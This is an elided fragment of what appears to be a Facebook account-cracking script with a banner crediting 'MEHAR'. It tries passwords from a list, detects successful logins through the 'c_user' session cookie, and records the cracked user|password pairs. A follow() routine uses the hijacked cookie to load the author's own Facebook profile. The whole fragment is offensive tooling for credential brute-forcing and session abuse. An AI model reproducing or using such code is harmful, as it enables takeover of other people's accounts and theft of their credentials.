...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           MEHAR
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          MEHAR-🤟
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           MEHAR-
...
class __xxx__:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [MEHAR-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100073442572870&mibextid=ZbWKwL', cookies={'cookie': coki}).text, 'html.parser')
